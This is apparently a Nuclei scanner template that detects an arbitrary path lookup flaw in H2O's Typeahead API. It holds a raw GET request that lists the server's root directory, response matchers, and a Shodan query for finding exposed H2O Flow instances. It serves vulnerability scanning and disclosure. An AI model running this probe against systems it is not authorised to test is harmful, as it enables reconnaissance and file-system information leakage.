http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"/bin"'
    - '"__meta":'
    - '"schema_name":'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /3/Typeahead/files?src=%2F&limit=10 HTTP/1.1

    Host: {{Hostname}}

    '
id: h2o-arbitary-file-read
info:
  author: danmcinerney,byt3bl33d3r
  classification:
    cpe: cpe:2.3:a:h2o:h2o:*:*:*:*:*:*:*:*
    cwe-id: CWE-200
  description: 'H2O allows for arbitrary path lookup via it''s Typehead API endpoint

    '
  metadata:
    max-request: 1
    product: h2o
    shodan-query: title:"H2O Flow"
    vendor: h2o
    verified: true
  name: H2O - Arbitrary Path Lookup
  reference:
  - https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc/
  severity: medium
  tags: h2o-3,h2o,info-leak,lfi,misconfig,vuln
